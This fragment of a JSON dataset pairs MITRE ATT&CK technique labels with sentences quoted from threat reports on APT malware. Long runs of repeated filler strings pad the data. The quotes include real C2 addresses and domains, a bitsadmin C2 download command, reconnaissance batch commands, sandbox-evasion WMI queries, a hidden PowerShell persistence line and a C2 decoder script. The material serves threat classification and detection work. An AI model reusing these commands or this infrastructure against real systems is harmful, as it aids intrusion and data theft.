        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe",
        "sch.exe"
    ],
    "windows management instrumentation timestomp masquerading file and directory discovery data staged data encrypted-multi": {
        "technique_names": [
            "windows management instrumentation",
            "timestomp",
            "masquerading",
            "file and directory discovery",
            "data staged",
            "data encrypted",
            "tor"
        ],
        "sentances": [
            "Command Description   search Searches for corresponding files   search&upload Encrypts and adds the corresponding files to the upload directory with the provided name   uploadfile Encrypts and adds the specified file to the upload directory with the provided name   uploadfolder Encrypts and adds the mentioned directory to the upload directory with the provided name   shellexecute Silently executes received command with cmd.exe   wmic Silently executes received command with wmic.exe (for WMI commands)   sendIEPass Encrypts and adds all gathered browser data into files for upload to C2   uninstall Removes files, directory and BITS tasks    Cryptography To decrypt the configuration data, the malware uses XOR with 25-character keys such as \u201cwaEHleblxiQjoxFJQaIMLdHKz\u201d that are different for every sample"
        ]
    },
    "standard application layer protocol exfiltration over command and control channel-multi": {
        "technique_names": [
            "standard application layer protocol",
            "exfiltration over command and control channel"
        ],
        "sentances": [
            "Probably full and active window screenshot quality   captureActiveQC 40   CaptureSites VPN*0,0 Login*0,0 mail*0,0 Security*0,0 Window titles of interest for screenshots, using left mouse button and Enter keypress hook   important upLog.txt upSCRLog.txt upSpecial.txt upFile.txt upMSLog.txt List of files to send to C2 using bitsadmin.exe from the dedicated thread   maxUpFileSizeKByte 1000000 Maximum size of file uploaded to C2   Servers http://108.61.189.174 Control server HTTP URL   ZipPass KtJvOXulgibfiHk Password for uploaded zip archives   browserPasswordCheckTimeout 300000 Milliseconds to wait between gathering key3.db, cookies.sqlite and other browser files in dedicated thread    Most of the parameters are self-explanatory"
        ]
    },
    "screen capture clipboard data-multi": {
        "technique_names": [
            "screen capture",
            "clipboard data"
        ],
        "sentances": [
            "It sets keyboard and mouse hooks to its handlekeys() and MouseHookProc() functions respectively and starts several working threads:    ID Thread description   1 Gets commands from C2 and saves them to a file and system registry using the bitsadmin.exe utility   2 Decrypts command from registry using RC4 with a hardcoded key, and executes it   3 Transfers screenshots from the clipboard to \\Cache005 subdirectory and Unicode text from clipboard to log.txt, XOR-ed with the \u201csalamati\u201d key (\u201chealth\u201d in Farsi)   4 Transfers screenshots to \\Cache005 subdirectory with captureScreenTimeOut and captureScreenTimeOut frequencies   5 Checks network connection, encrypts and sends gathered logs   6 Unhooks mouse and keyboard, removes bitsadmin task   7 Checks if malware\u2019s working directory size already exceeds its threshold   8 Gathers victim\u00b4s credentials, visited website cache, decrypted Chrome login data, as well as Firefox databases with cookies, keys, signons and downloads    The malware uses the following command to receive data from its C2:       bitsadmin.exe /TRANSFER HelpCenterDownload /DOWNLOAD /PRIORITY normal <server> <file>http://<server_config>/asp.asp?ui=<host_name>nrg-<adapter_info>-<user_name>     Activity logging module (Splitter.exe) This module is called from the main thread to obtain screenshots of windows whose titles are specified in the configuration CaptureSites field, bitmaps and text from clipboard, etc"
        ]
    },
    "screen capture clipboard data data compressed data encoding data encrypted-multi": {
        "technique_names": [
            "screen capture",
            "clipboard data",
            "data compressed",
            "data encoding",
            "data encrypted"
        ],
        "sentances": [
            "Specifies the screen coordinates to take   -zip Name of password (from configuration data) protected zip archive   -clipboard Screenshot file name where a bitmap from the clipboard is saved in Cache005 subdirectory, zipped with password from configuration    Data exfiltration Exfiltration is done through the bitsadmin.exe utility"
        ]
    },
    "spearphishing link": [
        "Cyber threat groups\u2019 access to the media organization\u2019s networks could potentially provide the government advance warning on upcoming protests, information on pro-democracy group leaders, and insights needed to disrupt activity on the Internet, such as what occurred in mid-2014 when several websites were brought down in denial of service attacks.[8] Threat Actors Use Spear Phishing Written in Traditional Chinese Script in Attempted Intrusions In August 2015, the threat actors sent spear phishing emails to a number of Hong Kong-based media organizations, including newspapers, radio, and television",
        "On occasions, the phishing emails contained links to external domains to download the first stage, and sometimes the first stage was attached to the email itself",
        "These emails included recruitment themed lures and contained links to malicious HTML application (.hta) files",
        "The first link was labeled as \"Comparison of Major Tasks in '16 & '17\" and the second link was identified as \"Comparison between '16 & '17\".Upon opening these links the user was presented with a further decoy Hangul document",
        "It is highly likely the adversary then used spear-phishing attacks containing links to these malicious documents as a delivery mechanism",
        "Group123 Links?  As we explore the Korean malware landscape, we always have burning questions relating to any possible links with Group123",
        "It\u2019s important to remember, that while we were using Bitly links to help gauge click location, anyone who clicks these links (including researchers) are also counted",
        "email with an embedded tracking link"
    ],
    "masquerading spearphishing attachment web service-multi": {
        "technique_names": [
            "masquerading",
            "spearphishing attachment",
            "web service",
            "arp"
        ],
        "sentances": [
            "LOWBALL Malware Analysis The spear phishing emails contained three attachments in total, each of which exploited an older vulnerability in Microsoft Office (CVE-2012-0158):  MD5  Filename  b9208a5b0504cb2283b1144fc455eaaa  \u4f7f\u547d\u516c\u6c11\u904b\u52d5 \u6211\u5011\u7684\u7570\u8c61.doc  ec19ed7cddf92984906325da59f75351  \u65b0\u805e\u7a3f\u53ca\u516c\u4f48.doc  6495b384748188188d09e9d5a0c401a4  (\u4ee3\u767c)[\u91c7\u8a2a\u901a\u77e5]\u6e2f\u5927\u6821\u53cb\u95dc\u6ce8\u7d44\u905e\u4fe1\u884c\u52d5.doc   In all three cases, the payload was the same:  MD5  Filename  d76261ba3b624933a6ebb5dd73758db4  time.exe   This backdoor, known as LOWBALL, uses the legitimate Dropbox cloud-storage service to act as the CnC server"
        ]
    },
    "system service discovery remote file copy powershell-multi": {
        "technique_names": [
            "system service discovery",
            "remote file copy",
            "powershell"
        ],
        "sentances": [
            "We observed the threat group issue the following commands:  @echo off\u00a0  \u00a0dir c:\\ >> %temp%\\download\u00a0  \u00a0ipconfig /all >> %temp%\\download\u00a0  \u00a0net user >> %temp%\\download\u00a0  \u00a0net user /domain >> %temp%\\download\u00a0  \u00a0ver >> %temp%\\download\u00a0  \u00a0del %0\u00a0\u00a0  @echo off\u00a0  \u00a0dir \"c:\\Documents and Settings\" >> %temp%\\download\u00a0  \u00a0dir \"c:\\Program Files\\\u00a0  \u00a0\" >> %temp%\\download\u00a0  \u00a0net start >> %temp%\\download\u00a0  \u00a0net localgroup administrator >> %temp%\\download\u00a0  \u00a0netstat -ano >> %temp%\\download   These commands allow the threat group to gain information about the compromised computer and the network to which it belongs"
        ]
    },
    "standard application layer protocol system network configuration discovery-multi": {
        "technique_names": [
            "standard application layer protocol",
            "system network configuration discovery"
        ],
        "sentances": [
            "This particular sample connected to the CnC domain accounts.serveftp[.]com, which resolved to an IP address previously used by the threat group, although the IP had not been used for some time prior to this most recent activity:  MD5      0beb957923df2c885d29a9c1743dd94b  accounts.serveftp.com  59.188.0.197   BUBBLEWRAP is a full-featured backdoor that is set to run when the system boots, and can communicate using HTTP, HTTPS, or a SOCKS proxy",
            "The code obtains the external IP address via an HTTP request using to \u201chttp://checkip.dyndns.org/\u201d and uses a regular expression to locate an IP address from the HTTP response",
            "The payload will use a specific regular expressions dependent on the type of DNS query was used to obtain the command string, which can be seen in Table 2:    DNS TYPE Regex Pattern   A Address:\\s+(\\d+.\\d+.\\d+.\\d+)   AC \\d+-\\d+-(\\d+)-([\\w\\d+/=]+)-\\d-.ac.$Global:domain   AAAA Address:\\s+(([a-fA-F0-9]{0,4}:{1,4}[\\w|:]+){1,8})   CNAME,MX,TXT,SRV,SOA (\\d+)-([\\w\\d/=+]{0,})\\-.$Global:domain    Table 2 Types of responses provided by C2 These regular expressions are used to build strings that the payload will then subject to its command handler"
        ]
    },
    "scripting remote file copy-multi": {
        "technique_names": [
            "scripting",
            "remote file copy"
        ],
        "sentances": [
            "The malware beacons to this directory using the hardcoded API token and attempts to download these files (which are deleted from the Dropbox account after the download):  upload.bat, a batch script that the compromised machine will execute upload.rar, a RAR archive that contains at least two files: a batch script to execute, and often an executable (sometimes named rar.exe) \u00a0which the batch script will run and almost always uploads the results of download.rar to the cloud storage account silent.txt and period.txt, \u00a0small files sizes of 0-4 bytes that dictate the frequency to check in with the CnC  The threat actor will then download the results and then delete the files from the cloud storage account",
            "We are unsure of the shellcode hosted at this URL, but it is possible that additional shellcode-based payloads like Meterpreter could have been served by this shellcode",
            "Command   Description    0x31  Fingerprint System via WMI and Registry    0x32  Drop File and execute    0x33  Remote Shell    0x34  Terminate connection with C2    0x35  Download and run batch script    0x36  Download file on machine    0x37  Upload File    Table 2: FELIXROOT backdoor commands Figure 9 shows the log message decrypted from memory using the same mechanism shown in Figure 6 and Figure 7 for every command executed",
            "Here is the content of the file: /shellcode <90909090909090909090E800<...redacted\u2026>4D2D6DC95CBD5DC1811111111111111> def <7B0D0A2756...redacted\u2026>312067657420636C6F736566696C650D0A717569740D0A7D> token pop exch pop Exec  The executed shellcode will first perform a decoding routine designed to download an additional payload from the internet"
        ]
    },
    "masquerading shortcut modification-multi": {
        "technique_names": [
            "masquerading",
            "shortcut modification"
        ],
        "sentances": [
            "Comnie, first named by Sophos seemingly after the Windows LNK file name it created, is a custom malware family that is used in targeted attacks, and has been observed in the wild since at least April 2013",
            "A shortcut file is generated in the following path:  %TEMP%\\~Update.lnk  This \u2018~Update.lnk\u2019 file is then copied to a filename of \u2018Windows help.lnk\u2019, which is placed in the startup path previously identified",
            "Again, a shortcut file is written to the %TEMP% path with a name of \u2018~Update.lnk\u2019, which is in turn copied to the identified startup path with a filename of \u2018Windows help.lnk\u2019"
        ]
    },
    "disabling security tools windows admin shares-multi": {
        "technique_names": [
            "disabling security tools",
            "windows admin shares"
        ],
        "sentances": [
            "Original File Name Translation Decoy Location Most Likely Target   1060315 \u672c\u90e8\u767c\u8a00\u53c3\u8003.doc 1060315 Headquarters Speech Reference.doc Defense Industry Development Strategy TW Defense   \u8f49\u7d66\u82e6\u903c\u7684\u7db2\u7ba1\u5144\u5f1f.doc Passing to cool fellow network administrators.doc Network administration jokes TW High Tech Telecommunication     2.SC OAM Firewall Policy_0306.xls 2.SC OAM Firewall Policy_0306.xls Network topology diagrams TW High Tech Telecommunication    \u00a0  Figure 3 Decoy document discussing Taiwan\u2019s defense industry development strategy  Figure 4 Network firewall configuration description for a telecommunication company in Taiwan \u00a0  Figure 5 Decoy document providing network topology information \u00a0 It is worth noting that in the attack that made use of the decoy document in Figure 4, the attacker also included related firewall logs and appears to have originated from a compromised an IT service vendor"
        ]
    },
    "rundll32 shortcut modification-multi": {
        "technique_names": [
            "rundll32",
            "shortcut modification"
        ],
        "sentances": [
            "The built-in Windows utility rundll32.exe is then used to load this DLL by the original .lnk file",
            "This shortcut file points to \u2018C:\\Windows\\system32\\rundll32.exe \u201c%APPDATA%\\cnagnt.dll\u201d,Sd\u2019    One of the exceptions to the installation routine above is in the event Symantec is detected"
        ]
    },
    "binary padding": [
        "A total of 64MB of garbage data is appended to this copied file, likely as a way to deter any security products in place that may be scanning files on disk"
    ],
    "process injection dll search order hijacking file deletion dll side-loading-multi": {
        "technique_names": [
            "process injection",
            "dll search order hijacking",
            "file deletion",
            "dll side-loading"
        ],
        "sentances": [
            "If running with administrator privileges on a 32-bit host:  Copy the temporary DLL in %TEMP% to %WINDOWS%\\LINKINFO.dll   Otherwise:  Copy the temporary DLL in %TEMP% to %APPDATA%\\cnagnt.dll Delete the temporary DLL in %TEMP% Write a \u2018Conime.lnk\u2019 file in the user\u2019s startup path"
        ]
    },
    "deobfuscate/decode files or information exfiltration over command and control channel exfiltration over alternative protocol-multi": {
        "technique_names": [
            "deobfuscate/decode files or information",
            "exfiltration over command and control channel",
            "exfiltration over alternative protocol"
        ],
        "sentances": [
            "The results of the decoded data may be seen below: \u00a0  Figure 13 Decrypted information The decrypted data contains URLs for various online services that will be used by the attacker for downloading data that will contain the command and control (C2) server(s) and port(s) to be used by Comnie"
        ]
    },
    "web service exfiltration over command and control channel-multi": {
        "technique_names": [
            "web service",
            "exfiltration over command and control channel"
        ],
        "sentances": [
            "Comnie will make requests to these URLs, looking for base64-encoded data after an identifier of \u2018magnet:/\u2019, as seen in the example below: Figure 14 GitHub storing Comnie C2 information In the example above, the C2 information is being stored within the user\u2019s URL parameter within GitHub"
        ]
    },
    "custom cryptographic protocol exfiltration over alternative protocol data encrypted-multi": {
        "technique_names": [
            "custom cryptographic protocol",
            "exfiltration over alternative protocol",
            "data encrypted"
        ],
        "sentances": [
            "The prior example decrypts to the following: mailto:121.126.211[.]94:8080;80;80 \u00a0 The following Python script may be used to decode the C2 data used by the newest Comnie variant:      12345678910111213141516171819202122232425262728293031323334353637383940  import base64import sysimport refrom string import maketransfrom struct import *import requestsdef rc4_crypt(data, key):\u00a0\u00a0S = range(256)\u00a0\u00a0j = 0\u00a0\u00a0out = []\u00a0\u00a0for i in range(256):\u00a0\u00a0\u00a0\u00a0j = (j + S[i] + ord( key[i % len(key)] )) % 256\u00a0\u00a0\u00a0\u00a0S[i] , S[j] = S[j] , S[i]\u00a0\u00a0i = j = 0\u00a0\u00a0for char in data:\u00a0\u00a0\u00a0\u00a0i = ( i + 1 ) % 256\u00a0\u00a0\u00a0\u00a0j = ( j + S[i] ) % 256\u00a0\u00a0\u00a0\u00a0S[i] , S[j] = S[j] , S[i]\u00a0\u00a0\u00a0\u00a0out.append(chr(ord(char) ^ S[(S[j] + S[i]) % 256]))\u00a0\u00a0return ''.join(out)def decode(data):\u00a0\u00a0o = \"\"\u00a0\u00a0for d in data:\u00a0\u00a0\u00a0\u00a0od = ord(d)\u00a0\u00a0\u00a0\u00a0o += chr((4 * (16 * od | od & 0xC) | (((od >> 4 | od & 0x30) >> 2))) & 0xFF)\u00a0\u00a0return obase64fixTable = maketrans(\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"[::-1], \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\");def trans(string):\u00a0\u00a0return str(string).translate(base64fixTable)def altdecode(string):\u00a0\u00a0return base64.b64decode(trans(string))req = requests.get(sys.argv[1])fd = req.textoriginal_data = re.search(\"magnet:/\\?([^\\?]+)\\?\", fd).group(1)parsed_data = altdecode(original_data)dataLength = unpack(\"<I\", parsed_data[64:68])[0]key = decode(parsed_data[0:64])data = parsed_data[dataLength*-1:]d = rc4_crypt(data, key)print(d)     \u00a0 Comnie will make attempts at connecting to the IP address above using the various ports specified"
        ]
    },
    "system service discovery": [
        "Using this example, Comnie will then request data to supply to the BAT script, via the following decrypted request: h=HOSTNAME-PC&f=gethostinfo.bat&c=& Based on network traffic witnessed, the remote C2 server was found to respond with the following information:       netstat -ano > %TEMP%\\info.datipconfig /all >> %TEMP%\\info.datroute PRINT >> %TEMP%\\info.datnet view >> %TEMP%\\info.dattasklist >> %TEMP%\\info.datnet user >> %TEMP%\\info.datnet start >> %TEMP%\\info.dat     \u00a0 This script is written to a temporary file prior to be executed",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        "tasklist /svc ",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query",
        " sc query"
    ],
    "hidden files and directories": [
        "The final part of the VBA script changes the properties of these two files, setting their attributes to Hidden",
        "The locations:  For root user  path: /Library/CoreMediaIO/Plug-Ins/FCP-DAL/iOSScreenCapture.plugin/Contents/Resources/ processname: screenassistantd  For regular user  path: ~/Library/Spelling/ processname: spellagentd Subsequently, it implements the Loader::installLoader method, reading the hardcoded 64-bit Mach-O executable (magic value 0xFEEDFACF), and writing to the previously determined path and file",
        "At installation, the MSI file drops three files and creates one hidden directory (UFile) into C:\\ProgramData\\Apple\\Update\\, likely as a ruse"
    ],
    "spearphishing link security software discovery user execution-multi": {
        "technique_names": [
            "spearphishing link",
            "security software discovery",
            "user execution",
            "arp"
        ],
        "sentances": [
            "CoverageAdditional ways our customers can detect and block this threat are listed below.Advanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors.CWS or WSA web scanning prevents access to malicious websites and detects malware used in these attacks.Email Security can block malicious emails sent by threat actors as part of their campaign.Network Security appliances such as NGFW, NGIPS, and Meraki MX can detect malicious activity associated with this threat.AMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security products.Umbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network.Open Source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org.IOCsFilesOffice Documents:c4be15f9ccfecf7a463f3b1d4a17e7b4f95de939e057662c3f97b52f7fa3c52fe5511b22245e26a003923ba476d7c36029939b2d1936e17a9b35b396467179aeefb235776851502672dba5ef45d96cc65cb9ebba1b49949393a6a85b9c822f52Seduploader Dropper:522fd9b35323af55113455d823571f71332e53dde988c2eb41395cf6b0c15805Sedupload Payload:ef027405492bc0719437eb58c3d2774cc87845f30c40040bbebbcc09a4e3dd18NetworksCC:myinvestgroup[.]com"
        ]
    },
    "file and directory discovery obfuscated files or information-multi": {
        "technique_names": [
            "file and directory discovery",
            "obfuscated files or information",
            "tor"
        ],
        "sentances": [
            "ActiveMime Lure Files  MD5  2017\u5e74\u5458\u5de5\u5de5\u8d44\u6027\u6d25\u8d34\u989d\u7edf\u8ba1\u62a5\u544a.doc (2017\u00a0Statistical Report on Staff\u00a0Salary\u00a0and Allowances) 5458a2e4d784abb1a1127263bd5006b5  Thong tin.doc (Information) ce50e544430e7265a45fab5a1f31e529  Phan Vu Tutn CV.doc  4f761095ca51bfbbf4496a4964e41d4f  Ke hoach cuu tro nam 2017.doc (2017 Bailout Plan) e9abe54162ba4572c770ab043f576784  Instructions to GSIS.doc  fba089444c769700e47c6b44c362f96b  Hoi thao truyen thong doc lap.doc (Traditional Games) f6ee4b72d6d42d0c7be9172be2b817c1\u00a0  Gi\u1ea5y y\u00eau c\u1ea7u b\u1ed3i th\u01b0\u1eddng m\u1edbi 2016 - h\u1eb1ng.doc (New 2016 Claim Form) aa1f85de3e4d33f31b4f78968b29f175  Hoa don chi tiet tien no.doc (Debt Details) 5180a8d9325a417f2d8066f9226a5154  Thu moi tham du Hoi luan.doc (Collection of Participants) f6ee4b72d6d42d0c7be9172be2b817c1  Danh sach nhan vien vi pham ky luat.doc (List of Employee Violations) 6baafffa7bf960dec821b627f9653e44  No\u0323\u0302i-dung-qua\u0309ng-ca\u0301o.doc (Internal Content Advertising) 471a2e7341f2614b715dc89e803ffcac  H\u0110 DVPM-VTC 31.03.17.doc  f1af6bb36cdf3cff768faee7919f0733   Table 2: Sampling of APT32 Lure Files The Base64 encoded ActiveMime data also contained an OLE file with malicious macros"
        ]
    },
    "scheduled task scripting-multi": {
        "technique_names": [
            "scheduled task",
            "scripting"
        ],
        "sentances": [
            "Once macros were enabled on the target system, the malicious macros created two named scheduled tasks as persistence mechanisms for two backdoors on the infected system",
            "cUpdateCheckers.bat is launched and creates a scheduled task for GoogleUpdateschecker.vbs persistence"
        ]
    },
    "masquerading scripting-multi": {
        "technique_names": [
            "masquerading",
            "scripting"
        ],
        "sentances": [
            "The second named scheduled task, loaded as an XML file to falsify task attributes, ran a JavaScript code block that downloaded and launched a secondary backdoor, delivered as a multi-stage PowerShell script",
            "If unable to contact the C2 server initially, the shellcode is configured to reattempt communication with the C2 server address in the following pattern: \u00a0[a-z][a-z][a-z].stage.14919005.www1.proslr3[.]com VBScript #2 \u201cmshta.exe\u201d further executes the second VBScript \u201c58d2a83f777908.23270411.vbs\u201d, which creates a folder by GUID name inside \u201cIntel\u201d and drops the VBScript payloads and configuration files: \\Intel\\{BFF4219E-C7D1-2880-AE58-9C9CD9701C90}\\58d2a83f777638.60220156.ini \\Intel\\{BFF4219E-C7D1-2880-AE58-9C9CD9701C90}\\58d2a83f777688.78384945.ps1 \\Intel\\{BFF4219E-C7D1-2880-AE58-9C9CD9701C90}\\58d2a83f7776b5.64953395.txt \\Intel\\{BFF4219E-C7D1-2880-AE58-9C9CD9701C90}\\58d2a83f7776e0.72726761.vbs \\Intel\\{BFF4219E-C7D1-2880-AE58-9C9CD9701C90}\\58d2a83f777716.48248237.vbs \\Intel\\{BFF4219E-C7D1-2880-AE58-9C9CD9701C90}\\58d2a83f777788.86541308.vbs \\Intel\\{BFF4219E-C7D1-2880-AE58-9C9CD9701C90}\\Foxconn.lnk This script then executes \u201c58d2a83f777716.48248237.vbs\u201d, which is a variant of FIN7\u2019s HALFBAKED backdoor",
            "To install the payload, the script will create a file %APPDATA%\\OneDrive.bat and save the following string to it: powershell.exe -WindowStyle Hidden -exec bypass\u00a0 -File \u201c%APPDATA%\\OneDrive.ps1\u201d The script then writes a modified copy of itself to %APPDATA%\\OneDrive.ps1, with the code that performs this installation omitted",
            "The executable will drop the packaged QUADAGENT PowerShell script using the filename Office365DCOMCheck.ps1 in addition to a VBScript file with the same filename which will assist in the execution of it"
        ]
    },
    "scheduled task masquerading-multi": {
        "technique_names": [
            "scheduled task",
            "masquerading"
        ],
        "sentances": [
            "In most lures, one scheduled task persisted an APT32-specific backdoor and the other scheduled task initialized a commercially-available backdoor as backup",
            "Figure 4: APT32 ActiveMime Lures Create Two Named Scheduled Tasks In this example, a scheduled task named \u201cWindows Scheduled Maintenance\u201d was created to run Casey Smith\u2019s \u201cSquiblydoo\u201d App Whitelisting bypass every 30 minutes",
            "A second scheduled task named \u201cScheduled Defrags\u201d was created by loading the raw task XML with a backdated task creation timestamp of June 2, 2016",
            "To create the scheduled task, the PowerShell payload starts by writing the following to a VBScript file with the same name as the task name \u00a0(ex",
            "This DLL file creates a scheduled task named BaiduUpdateTask1, which attempts to run the malicious, spoofed MSBuild.exe every subsequent minute"
        ]
    },
    "indicator removal on host obfuscated files or information-multi": {
        "technique_names": [
            "indicator removal on host",
            "obfuscated files or information",
            "tor"
        ],
        "sentances": [
            "Several Mandiant investigations revealed that, after gaining access, APT32 regularly cleared select event log entries and heavily obfuscated their PowerShell-based tools and shellcode loaders with Daniel Bohannon\u2019s Invoke-Obfuscation framework"
        ]
    },
    "spearphishing link system service discovery account discovery remote system discovery fallback channels windows admin shares-multi": {
        "technique_names": [
            "spearphishing link",
            "system service discovery",
            "account discovery",
            "remote system discovery",
            "fallback channels",
            "windows admin shares",
            "arp"
        ],
        "sentances": [
            "C2 Infrastructure  103.53.197.202  104.237.218.70  104.237.218.72  185.157.79.3  193.169.245.78  193.169.245.137  23.227.196.210  24.datatimes.org  80.255.3.87  blog.docksugs.org  blog.panggin.org  contay.deaftone.com  check.paidprefund.org  datatimes.org  docksugs.org  economy.bloghop.org  emp.gapte.name  facebook-cdn.net  gap-facebook.com  gl-appspot.org  help.checkonl.org  high.expbas.net  high.vphelp.net  icon.torrentart.com  images.chinabytes.info  imaps.qki6.com  img.fanspeed.net  job.supperpow.com  lighpress.info  menmin.strezf.com  mobile.pagmobiles.info  news.lighpress.info  notificeva.com  nsquery.net  pagmobiles.info  paidprefund.org  push.relasign.org  relasign.org  share.codehao.net  seri.volveri.net  ssl.zin0.com  static.jg7.org  syn.timeizu.net  teriava.com  timeizu.net  tonholding.com  tulationeva.com  untitled.po9z.com  update-flashs.com  vieweva.com  volveri.net  vphelp.net  yii.yiihao126.net  zone.apize.net   Table 4: Sampling of APT32 C2 Infrastructure"
        ]
    },
    "timestomp deobfuscate/decode files or information-multi": {
        "technique_names": [
            "timestomp",
            "deobfuscate/decode files or information"
        ],
        "sentances": [
            "The function builds the contents of a second file by concatenating several strings together, but this second file is a .sct file that the function will write to a file %TEMP%\\12-B-366.txt"
        ]
    },
    "security software discovery virtualization/sandbox evasion-multi": {
        "technique_names": [
            "security software discovery",
            "virtualization/sandbox evasion"
        ],
        "sentances": [
            "The series of commands, as seen in Table 2, include checks for virtualized environments, low memory, and processor counts, in addition to checks for common analysis tools running on the system"
        ]
    },
    "windows management instrumentation permission groups discovery system service discovery network share discovery file deletion virtualization/sandbox evasion query registry remote system discovery-multi": {
        "technique_names": [
            "windows management instrumentation",
            "permission groups discovery",
            "system service discovery",
            "network share discovery",
            "file deletion",
            "query registry",
            "remote system discovery",
            "virtualization/sandbox evasion"
        ],
        "sentances": [
            "PowerShell command Description   \u2018gwmi -query \u201cselect * from win32_BIOS where SMBIOSBIOSVERSION LIKE \u2018%VBOX%'\u201d Query attempts to detect VirtualBox environment from the win32_BIOS WMI class   gwmi -query \u201cselect * from win32_BIOS where SMBIOSBIOSVERSION LIKE \u2018%bochs%'\u201d Query attempts to detect Bochs environment from the win32_BIOS WMI class   gwmi -query \u201cselect * from win32_BIOS where SMBIOSBIOSVERSION LIKE \u2018%qemu%'\u201d Query attempts to detect QEMU environment from the win32_BIOS WMI class   gwmi -query \u201cselect * from win32_BIOS where SMBIOSBIOSVERSION LIKE \u2018%VirtualBox%'\u201d Query attempts to detect VirtualBox environment from the win32_BIOS WMI class   gwmi -query \u201cselect * from win32_BIOS where SMBIOSBIOSVERSION LIKE \u2018%VM%'\u201d Query attempts to detect VMWare environment from the win32_BIOS WMI class   gwmi -query \u201cSelect * from win32_BIOS where Manufacturer LIKE \u2018%XEN%'\u201d Query attempts to detect Xen environment from the win32_BIOS WMI class   gwmi win32_computersystem Uses this query to check the system information for the string \u201cVMware\u201d"
        ]
    },
    "security software discovery process discovery-multi": {
        "technique_names": [
            "security software discovery",
            "process discovery"
        ],
        "sentances": [
            "Get-Process | select Company Checks to see if any running processes have \u201cWireshark\u201d or \u201cSysinternals\u201d as the company name"
        ]
    },
    "security software discovery virtualization/sandbox evasion system time discovery-multi": {
        "technique_names": [
            "security software discovery",
            "system time discovery",
            "virtualization/sandbox evasion"
        ],
        "sentances": [
            "Just like in the sandbox checks, the Trojan checks for an attached debugger each time it issues a DNS query; if it does detect a debugger it will issue a DNS query to resolve 676f6f646c75636b.gogle[.]co"
        ]
    },
    "standard application layer protocol fallback channels-multi": {
        "technique_names": [
            "standard application layer protocol",
            "fallback channels"
        ],
        "sentances": [
            "^testmode Runs the test function to determine which DNS query types can successfully communicate with the C2   ^showconfig Creates a pipe delimited (\u201c|\u201d) string that contains the sample\u2019s settings, including the list of C2 domains and available DNS query types",
            "If the Trojan receives this echo, it will create the following file that the Trojan uses as a signal that it was able to successfully communicate with its C2 server: %APPDATA%\\Windows\\ShwDoc.srv If the Trojan determines the C2 server wishes to send a command, it sends an HTTP request to the following URL: hxxp://www.windowspatch[.]com/tahw?<hex(STDOUT of whoami command)> The Trojan will first check the response to this request for the string spoo, which signifies the C2 does not wish to issue a command",
